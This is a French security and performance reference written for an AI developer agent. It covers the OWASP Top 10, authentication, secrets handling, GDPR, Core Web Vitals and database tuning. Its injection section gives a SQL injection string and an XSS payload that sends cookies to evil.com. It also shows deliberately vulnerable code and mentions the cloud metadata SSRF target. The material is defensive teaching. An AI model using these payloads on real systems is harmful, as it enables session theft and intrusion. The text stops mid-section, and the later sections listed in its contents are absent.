# Securite Applicative et Performance -- Reference Agent IA Developpeur

> Base de connaissances exhaustive pour un agent IA developpeur.
> Derniere mise a jour : Mars 2026.

---

## TABLE DES MATIERES

1. [OWASP Top 10 (2021)](#1-owasp-top-10-2021)
2. [Securite par design](#2-securite-par-design)
3. [Securite des donnees](#3-securite-des-donnees)
4. [Performance web/mobile](#4-performance-webmobile)
5. [Performance mobile specifique](#5-performance-mobile-specifique)
6. [Monitoring et observabilite](#6-monitoring-et-observabilite)

---

## 1. OWASP TOP 10 (2021)

Le OWASP Top 10 est le standard de reference mondial pour les risques de securite des applications web. Version 2021.

### A01:2021 -- Broken Access Control (Controle d'acces defaillant)

**Description :** 94% des applications testees presentent cette vulnerabilite. Un attaquant accede a des ressources ou actions non autorisees : consultation de donnees d'autres utilisateurs, elevation de privileges, modification de droits.

**Exemples de failles :**
- IDOR (Insecure Direct Object Reference) : acceder a `/api/users/42/profile` en changeant l'ID
- Elevation de privileges (utilisateur standard accede a `/admin`)
- Manipulation de tokens/cookies pour usurper une identite

**Code vulnerable :**
```python
# VULNERABLE : pas de verification du proprietaire
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.orders.find_one({"_id": order_id})
    return jsonify(order)
```

**Code securise :**
```python
# SECURISE : verification que l'utilisateur est proprietaire
@app.route('/api/orders/<order_id>')
@login_required
def get_order(order_id):
    order = db.orders.find_one({
        "_id": order_id,
        "user_id": current_user.id  # Filtre par utilisateur connecte
    })
    if not order:
        abort(403)
    return jsonify(order)
```

**Prevention :**
- Toujours verifier l'autorisation cote serveur (jamais cote client uniquement)
- Appliquer le principe du moindre privilege par defaut (deny by default)
- Centraliser la logique de controle d'acces
- Desactiver le listing des repertoires du serveur web
- Logger les echecs de controle d'acces et alerter les administrateurs
- Limiter le debit des appels API pour reduire les attaques automatisees
- Invalider les tokens JWT cote serveur apres deconnexion

---

### A02:2021 -- Cryptographic Failures (Defaillances cryptographiques)

**Description :** Exposition de donnees sensibles due a une cryptographie faible, absente ou mal implementee. Concerne les mots de passe, numeros de carte, donnees de sante, tokens, cles privees.

**Exemples de failles :**
- Transmission de donnees en clair (HTTP au lieu de HTTPS)
- Utilisation d'algorithmes obsoletes (MD5, SHA1, DES)
- Cles de chiffrement codees en dur dans le code source
- Absence de chiffrement au repos pour les donnees sensibles

**Code vulnerable :**
```python
# VULNERABLE : MD5 pour hacher un mot de passe
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# VULNERABLE : cle en dur dans le code
SECRET_KEY = "ma-cle-super-secrete-123"
```

**Code securise :**
```python
# SECURISE : Argon2 pour le hachage de mot de passe
from argon2 import PasswordHasher
ph = PasswordHasher(
    memory_cost=19456,  # 19 MiB minimum (recommandation OWASP)
    time_cost=2,        # 2 iterations
    parallelism=1
)
password_hash = ph.hash(password)

# SECURISE : cle depuis variable d'environnement
import os
SECRET_KEY = os.environ["SECRET_KEY"]
```

**Prevention :**
- Classifier les donnees selon leur sensibilite
- Ne pas stocker de donnees sensibles inutilement
- Chiffrer toutes les donnees sensibles au repos (AES-256)
- Imposer HTTPS partout avec HSTS
- Utiliser des algorithmes a jour et des cles suffisamment longues
- Utiliser un gestionnaire de secrets (Vault, AWS Secrets Manager)
- Ne jamais utiliser MD5 ou SHA1 pour du hachage de mot de passe

---

### A03:2021 -- Injection

**Description :** Des donnees non fiables sont envoyees a un interpreteur (SQL, NoSQL, LDAP, OS, XSS) dans le cadre d'une commande ou requete. L'attaquant peut lire, modifier ou supprimer des donnees, voire prendre le controle du systeme.

**Types d'injection :** SQL, NoSQL, OS Command, LDAP, XPath, XSS (cross-site scripting).

**Code vulnerable :**
```python
# VULNERABLE : injection SQL
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
# Attaque : username = "admin' OR '1'='1' --"

# VULNERABLE : XSS
return f"<h1>Bienvenue {user_input}</h1>"
# Attaque : user_input = "<script>document.location='https://evil.com/?c='+document.cookie</script>"
```

**Code securise :**
```python
# SECURISE : requetes parametrees
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, hashed_password))

# SECURISE : ORM (SQLAlchemy)
user = User.query.filter_by(username=username).first()

# SECURISE : echappement de sortie (Jinja2 auto-echappe par defaut)
return render_template("welcome.html", name=user_input)
```

**Prevention :**
- Utiliser des requetes parametrees / prepared statements (JAMAIS de concatenation)
- Utiliser un ORM
- Valider et assainir toutes les entrees cote serveur (allowlist)
- Echapper les sorties selon le contexte (HTML, JS, CSS, URL)
- Limiter les resultats SQL pour eviter les divulgations massives

---

### A04:2021 -- Insecure Design (Conception non securisee)

**Description :** Categorie nouvelle en 2021. Defauts fondamentaux de conception, pas de simples bugs d'implementation. Absence de modelisation des menaces, de patterns securises, d'architecture de reference.

**Exemples :**
- Pas de limitation du nombre de tentatives de connexion
- Systeme de recuperation de mot de passe basee sur des questions devinables
- Pas de separation entre les environnements (dev/staging/prod)

**Prevention :**
- Realiser une modelisation des menaces (threat modeling) AVANT de coder
- Integrer des user stories d'abus ("En tant qu'attaquant, je veux...")
- Utiliser des design patterns securises (ex : defense en profondeur)
- Effectuer des revues d'architecture securite
- Definir des limites de ressources et de debit par utilisateur/service
- Segreger les environnements et les niveaux de responsabilite

---

### A05:2021 -- Security Misconfiguration (Mauvaise configuration)

**Description :** 70%+ des applications ont des problemes de configuration. Headers de securite manquants, fonctionnalites inutiles activees, comptes/mots de passe par defaut, messages d'erreur trop verbeux.

**Exemples :**
- Stack traces exposees en production
- Repertoire `.git` accessible publiquement
- Console d'administration accessible sans authentification
- Headers de securite absents

**Code vulnerable :**
```python
# VULNERABLE : mode debug en production
app = Flask(__name__)
app.config['DEBUG'] = True  # Expose les stack traces
```

**Code securise :**
```python
# SECURISE : configuration par environnement
app = Flask(__name__)
app.config['DEBUG'] = os.environ.get('FLASK_ENV') == 'development'

# Headers de securite
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '0'  # Desactive (CSP prefere)
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    return response
```

**Prevention :**
- Processus de durcissement reproductible et automatise
- Supprimer les fonctionnalites, composants et documentation inutiles
- Revue des configurations a chaque mise a jour
- Architecture segmentee avec des permissions minimales
- Envoyer des directives de securite aux clients (headers HTTP)
- Verifier l'efficacite des configurations via des scans automatises

---

### A06:2021 -- Vulnerable and Outdated Components (Composants vulnerables)

**Description :** Utilisation de bibliotheques, frameworks ou logiciels avec des vulnerabilites connues. Inclut les dependances directes et transitives.

**Prevention :**
- Maintenir un inventaire complet de tous les composants et leurs versions
- Scanner regulierement avec des outils (OWASP Dependency-Check, Snyk, npm audit, pip-audit)
- Surveiller les CVE (Common Vulnerabilities and Exposures)
- Mettre a jour rapidement les composants critiques
- Supprimer les dependances inutilisees
- Utiliser uniquement des sources officielles via des canaux securises (HTTPS)
- Automatiser les mises a jour avec Dependabot / Renovate

```bash
# Audit des dependances
npm audit              # Node.js
pip-audit              # Python
bundle audit           # Ruby
cargo audit            # Rust
```

---

### A07:2021 -- Identification and Authentication Failures

**Description :** Mecanismes d'authentification faibles : credential stuffing, brute force, mots de passe faibles, absence de MFA, sessions mal gerees.

**Prevention :**
- Implementer le MFA (authentification multi-facteurs)
- Ne jamais deployer avec des identifiants par defaut
- Verifier les mots de passe faibles (top 10000 mots de passe les plus courants)
- Politique de mots de passe alignee sur NIST 800-63b (longueur > complexite)
- Limiter les tentatives de connexion avec un back-off exponentiel
- Utiliser un gestionnaire de sessions securise cote serveur
- Generer un nouvel ID de session apres authentification reussie
- Les IDs de session ne doivent pas figurer dans l'URL

---

### A08:2021 -- Software and Data Integrity Failures

**Description :** Hypotheses liees a l'integrite des mises a jour logicielles, des donnees critiques et des pipelines CI/CD sans verification.

**Exemples :**
- Mises a jour automatiques sans verification de signature
- Deserialisation de donnees non fiables
- Pipeline CI/CD compromis (supply chain attack)

**Prevention :**
- Verifier les signatures numeriques des logiciels et donnees
- Utiliser des registres de dependances de confiance
- Utiliser des outils comme OWASP Dependency Check pour verifier l'absence de vulnerabilites
- S'assurer que le pipeline CI/CD dispose de controles d'acces et de segregation
- Ne pas envoyer de donnees serialisees non signees/non chiffrees a des clients non fiables

---

### A09:2021 -- Security Logging and Monitoring Failures

**Description :** Sans journalisation et surveillance adequates, les breches ne sont pas detectees. Delai moyen de detection d'une breche : 200+ jours.

**Prevention :**
- Logger les evenements de securite : connexions (reussies et echouees), erreurs de controle d'acces, echecs de validation
- Format structure (JSON) avec timestamp, utilisateur, IP, action, resultat
- S'assurer que les logs ne sont pas injectables (assainir les donnees loguees)
- Centraliser les logs (ELK Stack, Grafana Loki, Datadog)
- Configurer des alertes pour les activites suspectes
- Etablir un plan de reponse aux incidents

---

### A10:2021 -- Server-Side Request Forgery (SSRF)

**Description :** L'application recupere une ressource distante sur instruction de l'utilisateur sans valider l'URL fournie. Permet d'acceder a des services internes (metadata cloud, bases de donnees internes).

**Code vulnerable :**
```python
# VULNERABLE : SSRF
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # L'attaquant peut acceder a http://169.254.169.254/metadata
    return response.text
```

**Code securise :**
```python
# SECURISE : validation avec allowlist
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    parsed = urlparse(url)

    if parsed.hostname not in ALLOWED_DOMAINS:
        abort(403, "Domaine non autorise")
    if parsed.scheme not in ('https',):
        abort(403, "Seul HTTPS est autorise")

    response = requests.get(url, timeout=5)
    return response.text
```

**Prevention :**
- Segmenter les fonctionnalites d'acces aux ressources distantes dans des reseaux separes
- Appliquer des politiques de pare-feu "deny by default"
- Valider toute URL fournie par l'utilisateur avec une allowlist
- Ne pas envoyer de reponses brutes au client
- Desactiver les redirections HTTP

---

## 2. SECURITE PAR DESIGN

### 2.1 Validation des entrees (Input Validation)

**Principe fondamental :** Ne jamais faire confiance aux donnees provenant de l'exterieur. Toujours valider cote serveur, meme si une validation cote client existe.

**Strategies :**

| Strategie | Description | Recommandation |
|-----------|-------------|----------------|
| **Allowlist (positive)** | Definir ce qui est valide, rejeter le reste | RECOMMANDE |
| **Denylist (negative)** | Bloquer les patterns connus mauvais | INSUFFISANT seul |
| **Canonicalisation** | Normaliser avant validation (decodage, lowercase) | OBLIGATOIRE |

**Regles de validation :**
```python
# Validation avec Pydantic (Python)
from pydantic import BaseModel, validator, constr, conint
import re

class UserInput(BaseModel):
    username: constr(min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_]+$')
    email: str
    age: conint(ge=0, le=150)

    @validator('email')
    def validate_email(cls, v):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(pattern, v):
            raise ValueError('Email invalide')
        return v.lower()  # Canonicalisation
```

```javascript
// Validation avec Zod (JavaScript/TypeScript)
import { z } from 'zod';

const UserSchema = z.object({
  username: z.string().min(3).max(30).regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email().transform(v => v.toLowerCase()),
  age: z.number().int().min(0).max(150),
});

// Utilisation
const result = UserSchema.safeParse(input);
if (!result.success) {
  // Gerer les erreurs de validation
}
```

**Checklist de validation :**
- Type de donnee correct
- Longueur min/max respectee
- Plage de valeurs autorisee
- Pattern/regex si applicable
- Encodage/decodage avant validation
- Validation cote serveur OBLIGATOIRE

---

### 2.2 Encodage de sortie (Output Encoding)

**Principe :** Encoder les donnees selon le contexte de sortie pour empecher l'execution de code injecte (XSS principalement).

| Contexte | Methode d'encodage |
|----------|-------------------|
| HTML body | HTML entity encoding (`&lt;`, `&gt;`, `&amp;`) |
| Attribut HTML | Attribut encoding (guillemets doubles, echappement) |
| JavaScript | JavaScript encoding (`\xHH`) |
| URL | Percent encoding (`%20`, `%3C`) |
| CSS | CSS hex encoding (`\HH`) |

```javascript
// MAUVAIS : insertion directe
element.innerHTML = userInput;

// BON : utiliser textContent (pas d'interpretation HTML)
element.textContent = userInput;

// BON : DOMPurify pour du HTML riche necessaire
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

---

### 2.3 Authentification -- Bonnes pratiques

#### JWT (JSON Web Tokens)

**Bonnes pratiques :**
- Toujours valider la signature, l'emetteur (`iss`) et l'audience (`aud`)
- Declarer explicitement l'algorithme attendu, rejeter `"none"`
- Utiliser des tokens a courte duree de vie (15 min access, 7j refresh)
- Cles HMAC >= 256 bits, RSA >= 2048 bits
- Stocker le refresh token en httpOnly cookie, JAMAIS en localStorage
- Implementer une revocation cote serveur (blacklist ou token versioning)

```javascript
// Verification JWT securisee (Node.js)
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  return jwt.verify(token, publicKey, {
    algorithms: ['RS256'],      // Algorithme explicite
    issuer: 'https://auth.example.com',
    audience: 'https://api.example.com',
    clockTolerance: 30,         // 30s de tolerance
    maxAge: '15m',              // Duree max
  });
}
```

#### OAuth2

**Bonnes pratiques (IETF BCP, janvier 2025) :**
- Utiliser PKCE (Proof Key for Code Exchange) pour TOUS les clients (pas seulement les SPA)
- Utiliser le parametre `state` avec un hash aleatoire (anti-CSRF)
- Toujours HTTPS pour la transmission de tokens
- Utiliser la cryptographie asymetrique (mTLS, Private Key JWT) pour l'authentification des clients confidentiels
- Preferer les tokens opaques (reference tokens) aux JWT pour les access tokens quand c'est possible
- Valider les redirect URIs strictement (pas de wildcards)

#### Sessions

**Bonnes pratiques :**
- Generer des IDs de session cryptographiquement aleatoires (>= 128 bits d'entropie)
- Regenerer l'ID de session apres authentification (anti session fixation)
- Definir les attributs de cookie : `Secure`, `HttpOnly`, `SameSite=Strict`, `Path=/`
- Expiration de session cote serveur (idle timeout + absolute timeout)
- Invalidation complete a la deconnexion

---

### 2.4 Autorisation -- Patterns

#### RBAC (Role-Based Access Control)

**Principe :** Attribuer des permissions en fonction de roles predefinies.

```python
# RBAC simple
ROLE_PERMISSIONS = {
    'admin': ['read', 'write', 'delete', 'manage_users'],
    'editor': ['read', 'write'],
    'viewer': ['read'],
}

def check_permission(user_role, required_permission):
    return required_permission in ROLE_PERMISSIONS.get(user_role, [])

# Utilisation
@app.route('/api/articles', methods=['DELETE'])
@login_required
def delete_article():
    if not check_permission(current_user.role, 'delete'):
        abort(403)
    # ...
```

**Avantages :** Simple, scalable, audit facile.
**Limites :** Granularite limitee, explosion des roles possible.

#### ABAC (Attribute-Based Access Control)

**Principe :** Decisions basees sur des attributs (utilisateur, ressource, environnement, action).

```python
# ABAC avec politique
def check_access(user, resource, action, context):
    policies = [
        # Un medecin peut voir les dossiers de ses patients
        lambda u, r, a, c: (
            u.role == 'medecin'
            and a == 'read'
            and r.type == 'dossier_patient'
            and r.medecin_id == u.id
        ),
        # Un admin peut tout faire pendant les heures de bureau
        lambda u, r, a, c: (
            u.role == 'admin'
            and 8 <= c.hour <= 18
        ),
    ]
    return any(p(user, resource, action, context) for p in policies)
```

**Avantages :** Tres granulaire, dynamique, contextuel.
**Limites :** Plus complexe, plus difficile a auditer.

#### Recommandation
- Commencer par RBAC pour les cas simples
- Evoluer vers ABAC quand les regles deviennent contextuelles
- Envisager PBAC (Policy-Based) pour les architectures microservices (Open Policy Agent / OPA)

---

### 2.5 Stockage des mots de passe

**Hierarchie recommandee (OWASP 2025) :**

| Algorithme | Recommandation | Configuration minimale |
|-----------|----------------|----------------------|
| **Argon2id** | RECOMMANDE (gold standard) | 19 MiB memoire, 2 iterations, 1 parallelisme |
| **bcrypt** | Acceptable | work factor >= 10, max 72 octets |
| **scrypt** | Acceptable | N=2^17, r=8, p=1 |
| **PBKDF2** | Legacy uniquement | 600 000 iterations, HMAC-SHA256 |

**Principes :**
- **Hacher, JAMAIS chiffrer** les mots de passe (hachage = sens unique)
- **Sel unique** par mot de passe (genere aleatoirement, >= 16 octets)
- **Poivre (pepper)** : secret partage stocke separement (pas en base)
- Ne jamais implementer son propre algorithme de hachage

```python
# RECOMMANDE : Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher(memory_cost=19456, time_cost=2, parallelism=1)

# Hacher
hashed = ph.hash("mot_de_passe_utilisateur")

# Verifier
try:
    ph.verify(hashed, "mot_de_passe_saisi")
    if ph.check_needs_rehash(hashed):
        # Re-hacher avec les nouveaux parametres si necessaire
        new_hash = ph.hash("mot_de_passe_saisi")
except argon2.exceptions.VerifyMismatchError:
    # Mot de passe incorrect
    pass
```

---

### 2.6 Configuration CORS

**Bonnes pratiques :**
- Ne JAMAIS utiliser `Access-Control-Allow-Origin: *` avec des credentials
- Lister explicitement les origines autorisees (allowlist)
- Ne pas refleter l'en-tete `Origin` sans validation
- Restreindre les methodes HTTP autorisees au strict necessaire
- Limiter les en-tetes custom exposes
- Definir `Vary: Origin` pour la correction du cache
- Toujours servir les endpoints CORS sur HTTPS

```javascript
// Configuration CORS securisee (Express.js)
const cors = require('cors');

const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Origine non autorisee par CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400,  // Cache preflight 24h
}));
```

---

### 2.7 Rate Limiting

**Strategies :**

| Type | Description | Cas d'usage |
|------|-------------|-------------|
| **Par IP** | Limite le nombre de requetes par adresse IP | Protection DDoS basique |
| **Par utilisateur** | Limite par compte authentifie | Anti-abus applicatif |
| **Par endpoint** | Limite specifique a certains endpoints | Login, API sensibles |
| **Sliding window** | Fenetre glissante | Plus precis que fixed window |
| **Token bucket** | Autorise des pics controles | APIs publiques |

```javascript
// Rate limiting avec express-rate-limit
const rateLimit = require('express-rate-limit');

// Limite globale
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requetes par fenetre
  standardHeaders: true,
  legacyHeaders: false,
});

// Limite specifique login (plus stricte)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                     // 5 tentatives par 15 min
  message: 'Trop de tentatives, reessayez dans 15 minutes',
  skipSuccessfulRequests: true,
});

app.use(globalLimiter);
app.post('/api/login', loginLimiter, loginHandler);
```

---

### 2.8 HTTPS Everywhere

**Obligations :**
- TLS 1.2 minimum, TLS 1.3 recommande
- Certificats valides et renouveles automatiquement (Let's Encrypt)
- HSTS (HTTP Strict Transport Security) avec `includeSubDomains` et `preload`
- Redirection automatique HTTP -> HTTPS (301)
- Desactiver les cipher suites faibles

```nginx
# Configuration Nginx securisee
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;

    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
}

server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

---

## 3. SECURITE DES DONNEES

### 3.1 Chiffrement au repos vs en transit

| Aspect | Au repos (at rest) | En transit (in transit) |
|--------|-------------------|------------------------|
| **Quoi** | Donnees stockees (disques, BDD, backups) | Donnees en mouvement (reseau) |
| **Menace** | Vol physique, fuite de backup, bucket mal configure | Man-in-the-middle, interception reseau |
| **Algorithme** | AES-256 (symetrique) | TLS 1.2/1.3 |
| **Gestion cles** | KMS / HSM, rotation reguliere, envelope encryption | Certificats X.509, renouvellement auto |

**Les deux sont necessaires.** Chiffrer uniquement en transit laisse les donnees vulnerables sur disque. Chiffrer uniquement au repos les laisse vulnerables sur le reseau.

---

### 3.2 Gestion des donnees sensibles (PII, credentials)

**Classification des donnees :**

| Niveau | Exemples | Traitement |
|--------|----------|-----------|
| **Critique** | Mots de passe, cles API, tokens | Hachage irreversible ou vault |
| **Confidentiel** | Numeros de carte, SSN, donnees medicales | Chiffrement AES-256, acces restreint |
| **Interne** | Emails, noms, adresses | Chiffrement si stocke, acces controle |
| **Public** | Donnees marketing, FAQ | Aucune protection speciale |

**Regles pour les PII :**
- Minimisation : ne collecter que le strict necessaire
- Pseudonymisation/anonymisation quand possible
- Chiffrement au niveau du champ pour les donnees critiques
- Droit a l'effacement (RGPD Article 17)
- Journalisation des acces aux donnees sensibles

---

### 3.3 Gestion des secrets et variables d'environnement

**INTERDIT :**
- Secrets dans le code source
- Secrets dans les fichiers de configuration versiones
- Secrets dans les logs
- Secrets dans les messages d'erreur

**RECOMMANDE :**

```bash
# .env (NON versionne, dans .gitignore)
DATABASE_URL=postgresql://user:pass@host:5432/db
JWT_SECRET=super-long-random-string-minimum-256-bits
API_KEY=sk-...

# .gitignore
.env
.env.*
*.pem
*.key
```

**Outils de gestion de secrets :**

| Outil | Type | Cas d'usage |
|-------|------|-------------|
| **HashiCorp Vault** | Self-hosted / Cloud | Secrets dynamiques, rotation automatique |
| **AWS Secrets Manager** | Cloud AWS | Integration native AWS |
| **GCP Secret Manager** | Cloud GCP | Integration native GCP |
| **Azure Key Vault** | Cloud Azure | Integration native Azure |
| **doppler** | SaaS | Multi-cloud, simple |
| **1Password CLI** | SaaS | Equipes petites a moyennes |

**Principes :**
- Rotation reguliere des secrets
- Acces avec moindre privilege
- Audit trail de chaque acces
- Secrets differents par environnement (dev/staging/prod)
- Envelope encryption pour les secrets en base

---

### 3.4 RGPD / Privacy by Design

**7 principes fondamentaux du Privacy by Design :**

1. **Proactif, pas reactif** -- Prevenir, pas guerir
2. **Protection par defaut** -- Parametres les plus protecteurs par defaut
3. **Protection integree** -- Securite dans l'architecture, pas en surcouche
4. **Fonctionnalite complete** -- Securite ET fonctionnalite, pas l'un au detriment de l'autre
5. **Securite de bout en bout** -- Protection sur tout le cycle de vie
6. **Visibilite et transparence** -- Politique claire et verifiable
7. **Respect de la vie privee** -- L'utilisateur au centre

**Obligations techniques RGPD :**
- Consentement explicite et granulaire
- Droit d'acces, de rectification, d'effacement, de portabilite
- Registre des traitements
- Analyse d'impact (DPIA) pour les traitements a risque
- Notification de breche dans les 72 heures
- DPO (Delegue a la Protection des Donnees) si necessaire
- Chiffrement comme mesure technique appropriee

**Sanctions :**
- Violation legere : jusqu'a 10M EUR ou 2% du CA mondial
- Violation grave : jusqu'a 20M EUR ou 4% du CA mondial

---

## 4. PERFORMANCE WEB/MOBILE

### 4.1 Core Web Vitals

Depuis mars 2024, INP (Interaction to Next Paint) remplace FID (First Input Delay).

| Metrique | Mesure | Bon | A ameliorer | Mauvais |
|---------|--------|-----|-------------|---------|
| **LCP** (Largest Contentful Paint) | Temps de chargement du plus grand element visible | < 2.5s | 2.5s - 4.0s | > 4.0s |
| **INP** (Interaction to Next Paint) | Reactivite aux interactions utilisateur | < 200ms | 200ms - 500ms | > 500ms |
| **CLS** (Cumulative Layout Shift) | Stabilite visuelle (decalages inattendus) | < 0.1 | 0.1 - 0.25 | > 0.25 |

**Seulement 47% des sites atteignent les seuils "Bon" en 2025.** Impact : perte de 8-35% en conversions, rankings et revenus.

#### Optimiser LCP
- Optimiser les images hero (format moderne, taille adaptee, preload)
- Reduire le TTFB (Time to First Byte) < 800ms
- Eliminer les ressources bloquantes (CSS/JS critiques inline)
- Precharger les polices web (`<link rel="preload">`)
- Utiliser un CDN

#### Optimiser INP
- Reduire le JavaScript sur le thread principal
- Code splitting et lazy loading des composants non critiques
- Web Workers pour les calculs lourds
- Eviter les re-renders inutiles (React.memo, useMemo, useCallback)
- Supprimer les event listeners inutilises

#### Optimiser CLS
- Definir des dimensions explicites sur images et videos (`width`/`height`)
- Reserver l'espace pour les contenus charges dynamiquement
- Eviter d'inserer du contenu au-dessus du contenu existant
- Utiliser `font-display: swap` pour les polices web
- Eviter les animations qui declenchent des changements de layout

---

### 4.2 Lazy Loading

**Principe :** Charger les ressources uniquement quand elles sont necessaires (proches du viewport ou sur interaction).

**ATTENTION :** Ne PAS lazy-loader le contenu above-the-fold (nuit au LCP).

```html
<!-- Images : lazy loading natif -->
<img src="photo.webp" loading="lazy" alt="Description" width="800" height="600">

<!-- Au-dessus de la ligne de flottaison : PAS de lazy loading + preload -->
<link rel="preload" as="image" href="hero.webp">
<img src="hero.webp" alt="Hero" width="1200" height="600" fetchpriority="high">
```

```javascript
// Lazy loading de composants React
import { lazy, Suspense } from 'react';

const HeavyChart = lazy(() => import('./HeavyChart'));

function Dashboard() {
  return (
    <Suspense fallback={<div>Chargement du graphique...</div>}>
      <HeavyChart />
    </Suspense>
  );
}
```

---

### 4.3 Code Splitting

**Principe :** Decouper le bundle JavaScript en morceaux charges a la demande.

**Strategies :**

| Strategie | Description |
|-----------|-------------|
| **Route-based** | Un chunk par route/page |
| **Component-based** | Composants lourds en chunks separes |
| **Vendor splitting** | Separer le code tiers (change moins souvent, meilleur cache) |

```javascript
// Webpack : splitChunks
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all',
        },
      },
    },
  },
};

// Route-based splitting (React Router)
const Home = lazy(() => import('./pages/Home'));
const Profile = lazy(() => import('./pages/Profile'));
const Settings = lazy(() => import('./pages/Settings'));
```

---

### 4.4 Strategies de cache

| Niveau | Mecanisme | Duree typique | Cas d'usage |
|--------|-----------|---------------|-------------|
| **Navigateur** | `Cache-Control`, `ETag`, `Last-Modified` | Minutes a annees | Assets statiques, API responses |
| **CDN** | Edge caching, `Vary`, cache keys | Minutes a jours | Images, CSS/JS, pages statiques |
| **API / Serveur** | Redis, Memcached, in-memory | Secondes a heures | Requetes BDD couteuses, sessions |
| **Service Worker** | Cache API, strategies offline | Variable | PWA, offline-first |

**Strategies de cache courantes :**

```
# Assets statiques immuables (fichiers avec hash dans le nom)
Cache-Control: public, max-age=31536000, immutable

# API dynamique
Cache-Control: private, max-age=0, must-revalidate
ETag: "abc123"

# Pages HTML
Cache-Control: public, max-age=300, s-maxage=3600
```

**Stale-While-Revalidate :** Sert le cache perime pendant la revalidation en arriere-plan.
```
Cache-Control: public, max-age=60, stale-while-revalidate=3600
```

---

### 4.5 Optimisation des images

**Formats modernes :**

| Format | Compression vs JPEG | Support navigateur | Cas d'usage |
|--------|--------------------|--------------------|-------------|
| **AVIF** | 50% plus petit | Chrome, Firefox, Safari 16.4+ | Meilleur choix quand supporte |
| **WebP** | 25-35% plus petit | Tous les navigateurs modernes | Choix par defaut polyvalent |
| **JPEG** | Reference | Universel | Fallback |

```html
<!-- Image responsive avec formats modernes -->
<picture>
  <source srcset="image.avif" type="image/avif">
  <source srcset="image.webp" type="image/webp">
  <img src="image.jpg" alt="Description"
       width="800" height="600"
       loading="lazy"
       decoding="async">
</picture>
```

**Checklist optimisation images :**
- Servir le format le plus efficace supporte (AVIF > WebP > JPEG)
- Redimensionner aux dimensions d'affichage (pas d'images 4000px pour un affichage 400px)
- Utiliser `srcset` et `sizes` pour le responsive
- Compresser (qualite 75-85% pour le lossy)
- Lazy-loader sous la ligne de flottaison
- Utiliser un CDN d'images (Cloudflare, Cloudinary, imgix) pour la transformation a la volee
- Definir `width` et `height` pour eviter le CLS

---

### 4.6 Optimisation de la taille du bundle

**Sequence d'optimisation recommandee :**

1. **Audit des dependances** : identifier les packages lourds
2. **Tree shaking** : eliminer le code mort (necessite les imports ES6)
3. **Code splitting** : decouper par route/composant
4. **Lazy loading** : charger a la demande
5. **Analyse en CI** : mesurer le bundle a chaque PR

```bash
# Analyser la taille du bundle
npx webpack-bundle-analyzer stats.json
npx source-map-explorer build/static/js/*.js

# Verifier la taille d'une dependance avant installation
npx bundlephobia <package-name>
```

**Bonnes pratiques :**
- Utiliser les imports ES6 (`import/export`), JAMAIS CommonJS (`require`) pour le tree shaking
- Preferer les imports nommes : `import { debounce } from 'lodash-es'` au lieu de `import _ from 'lodash'`
- Remplacer les grosses librairies par des alternatives legeres (date-fns vs moment, preact vs react pour les petits projets)
- Minification + compression Brotli/Gzip en production
- Budget de taille : < 170 KB JS compresse pour le chargement initial (recommandation performance)

---

### 4.7 Optimisation des requetes base de donnees

#### Le probleme N+1

```python
# PROBLEME N+1 : 1 requete + N requetes supplementaires
articles = Article.query.all()  # 1 requete
for article in articles:
    print(article.author.name)  # N requetes (1 par article!)

# SOLUTION : Eager loading (JOIN)
articles = Article.query.options(joinedload(Article.author)).all()  # 1 seule requete

# SOLUTION : Batch loading
articles = Article.query.all()  # 1 requete
author_ids = [a.author_id for a in articles]
authors = Author.query.filter(Author.id.in_(author_ids)).all()  # 1 requete
author_map = {a.id: a for a in authors}
```

#### Indexation

**Regles d'indexation :**
- Indexer les colonnes dans les clauses `WHERE`, `JOIN`, `ORDER BY`
- **Index composite** : pour les requetes multi-colonnes (`WHERE user_id = ? AND status = ?` -> index sur `(user_id, status)`)
- **Covering index** : inclut toutes les colonnes necessaires, evite d'acceder a la table
- **Index partiel** : sur un sous-ensemble de donnees (ex : `WHERE active = true`)
- **Ne pas sur-indexer** : chaque index ralentit les ecritures
- Utiliser `EXPLAIN ANALYZE` pour verifier l'utilisation des index

```sql
-- Index composite
CREATE INDEX idx_orders_user_status ON orders (user_id, status);

-- Index partiel (PostgreSQL)
CREATE INDEX idx_active_users ON users (email) WHERE active = true;

-- Covering index
